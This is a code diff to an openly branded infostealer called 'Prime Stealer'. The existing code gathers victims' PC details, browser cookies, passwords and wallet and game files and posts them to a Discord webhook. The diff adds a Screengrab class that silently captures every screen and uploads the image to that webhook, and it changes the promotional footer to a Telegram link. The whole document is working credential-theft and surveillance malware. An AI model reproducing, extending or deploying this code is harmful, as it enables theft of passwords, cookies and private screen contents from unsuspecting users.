@@ -37,6 +37,7 @@ import subprocess
 import uuid
 import socket
 import getpass
+from PIL import Image, ImageGrab
 def user_check():
         USERS = [
             "Primelus",
@@ -564,7 +565,7 @@ def UP104D70K3N(token, path):
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": "Prime Stealer | discord.gg/primestealer",
+                "text": "Prime Stealer | t.me/PrimeStealer Made By Prime",
                 "icon_url": "https://media.discordapp.net/attachments/1216499065521700987/1216500554612867082/prime.png?ex=66009d6d&is=65ee286d&hm=a868ad4bd7cc30d12008971650d2bd4745e9a80158b183dd2e60c7e9035ca1cf&=&format=webp&quality=lossless&width=204&height=204"
                 },
             "thumbnail": {
@@ -610,7 +611,7 @@ class PcInfo:
                     "description": f"<:userr:1164196007626670170> **PC Username:** `{username}`\n<:windowss:1164191405615362098> **PC Name:** `{hostname}`\n<:computerr:1164189052472393798> **OS:** `{computer_os}`\n\n<:blackworld:1164189050983415889> **IP:** `{ip}`\n<:wrenchh:1164189063306293358> **MAC:** `{mac}`\n<:keyy:1164192530456383529> **HWID:** `{hwid}`\n\n<:cpu:1164189055261605919> **CPU:** `{cpu.Name}`\n<:gpu:1164189947700453396> **GPU:** `{gpu.Name}`\n<:ramm:1164189059955036320> **RAM:** `{ram}GB`",
                     "color": color,
                     "footer": {
-                        "text": "Prime Stealer | discord.gg/primestealer",
+                        "text": "Prime Stealer | t.me/PrimeStealer Made By Prime",
                         "icon_url": "https://media.discordapp.net/attachments/1216499065521700987/1216500554612867082/prime.png?ex=66009d6d&is=65ee286d&hm=a868ad4bd7cc30d12008971650d2bd4745e9a80158b183dd2e60c7e9035ca1cf&=&format=webp&quality=lossless&width=204&height=204"
                     }
                 }
@@ -704,7 +705,7 @@ data = {
                     "description": f'Opera:```{robloopera}```\nChrome:```{roblochrome}```\nEdge:```{robloedge}```\nFirefox:```{roblofire}```\nOperaGX:```{roblogx}```\nChromium:```{roblochromium}```',
                     "color": color,
                     "footer": {
-                        "text": "Prime Stealer | discord.gg/primestealer",
+                        "text": "Prime Stealer | t.me/PrimeStealer Made By Prime",
                         "icon_url": "https://media.discordapp.net/attachments/1216499065521700987/1216500554612867082/prime.png?ex=66009d6d&is=65ee286d&hm=a868ad4bd7cc30d12008971650d2bd4745e9a80158b183dd2e60c7e9035ca1cf&=&format=webp&quality=lossless&width=204&height=204"
                     }
                 }
@@ -742,7 +743,7 @@ def UP104D(name, link):
                     "description": f"**Found**:\n{rb}\n\n**Data:**\n <:blackmember:1095740314683179139>  • **{C00K1C0UNt}** Cookies Found \n <:blackarrow:1095740975197995041> • [PrimeCookies.txt]({link})",
                     "color": color,
                     "footer": {
-                        "text": "Prime Stealer | discord.gg/primestealer",
+                        "text": "Prime Stealer | t.me/PrimeStealer Made By Prime",
                         "icon_url": "https://media.discordapp.net/attachments/1216499065521700987/1216500554612867082/prime.png?ex=66009d6d&is=65ee286d&hm=a868ad4bd7cc30d12008971650d2bd4745e9a80158b183dd2e60c7e9035ca1cf&=&format=webp&quality=lossless&width=204&height=204"
                     }
                 }
@@ -768,7 +769,7 @@ def UP104D(name, link):
                     "description": f"**Found**:\n{ra}\n\n**Data:**\n <:blacklock:1095741022065131571> • **{P455WC0UNt}** Passwords Found\n <:blackarrow:1095740975197995041> • [PrimePasswords.txt]({link})",
                     "color": color,
                     "footer": {
-                        "text": "Prime Stealer | discord.gg/primestealer",
+                        "text": "Prime Stealer | t.me/PrimeStealer Made By Prime",
                         "icon_url": "https://media.discordapp.net/attachments/1216499065521700987/1216500554612867082/prime.png?ex=66009d6d&is=65ee286d&hm=a868ad4bd7cc30d12008971650d2bd4745e9a80158b183dd2e60c7e9035ca1cf&=&format=webp&quality=lossless&width=204&height=204"
                     }
                 }
@@ -796,7 +797,7 @@ def UP104D(name, link):
                     "name": "Prime Stealer | Files"
                 },
                 "footer": {
-                    "text": "Prime Stealer | discord.gg/primestealer",
+                    "text": "Prime Stealer | t.me/PrimeStealer Made By Prime",
                     "icon_url": "https://media.discordapp.net/attachments/1216499065521700987/1216500554612867082/prime.png?ex=66009d6d&is=65ee286d&hm=a868ad4bd7cc30d12008971650d2bd4745e9a80158b183dd2e60c7e9035ca1cf&=&format=webp&quality=lossless&width=204&height=204"
                 }
                 }
@@ -981,7 +982,7 @@ def G47H3rZ1P5(paths1, paths2, paths3):
             "description": f"{wal}\n{ga}\n{ot}",
             "color": color,
             "footer": {
-                "text": "Prime Stealer | discord.gg/primestealer",
+                "text": "Prime Stealer | t.me/PrimeStealer Made By Prime",
                 "icon_url": "https://media.discordapp.net/attachments/1216499065521700987/1216500554612867082/prime.png?ex=66009d6d&is=65ee286d&hm=a868ad4bd7cc30d12008971650d2bd4745e9a80158b183dd2e60c7e9035ca1cf&=&format=webp&quality=lossless&width=204&height=204"
             }
             }
@@ -992,6 +993,37 @@ def G47H3rZ1P5(paths1, paths2, paths3):
     }
     L04DUr118(hook, data=dumps(data).encode(), headers=headers)
 
+class Screengrab:
+    def __init__(self):
+        self.get_inf(__CONFIG__["webhook"])
+
+    def get_inf(self, webhook):
+        image = ImageGrab.grab(
+            bbox=None,
+            all_screens=True,
+            include_layered_windows=False,
+            xdisplay=None
+        )
+        image.save(temp_path + "\\desktopshot.png")
+        image.close()
+        webhook_data = {
+            "username": "PrimeStealer",
+            "avatar_url": "https://media.discordapp.net/attachments/1216499065521700987/1216500554612867082/prime.png?ex=66009d6d&is=65ee286d&hm=a868ad4bd7cc30d12008971650d2bd4745e9a80158b183dd2e60c7e9035ca1cf&=&format=webp&quality=lossless&width=204&height=204",
+            "embeds": [
+                {
+                    "title": "Screenshot",
+                    "image": {
+                        "url": "attachment://image.png"
+                    }
+                }
+            ]
+        }
+
+        with open(temp_path + "\\desktopshot.png", "rb") as f:
+            image_data = f.read()
+            encoder = MultipartEncoder({'payload_json': json.dumps(webhook_data), 'file': ('image.png', image_data, 'image/png')})
+
+        requests.post(hook, headers={'Content-type': encoder.content_type}, data=encoder)
 
 def Z1P73136r4M(path, arg, procc):
     global O7H3rZ1p
@@ -1305,7 +1337,7 @@ if not DETECTED:
         if len(arg[2]) != 0:
             foldpath = arg[1]
             foldlist = arg[2]       
-            filetext += f"<:openfolder:1111408286332375040> {foldpath}\n"
+            filetext += f"<:9251file:1221210002837082203> {foldpath}\n"
 
             for ffil in foldlist:
                 a = ffil[0].split("/")
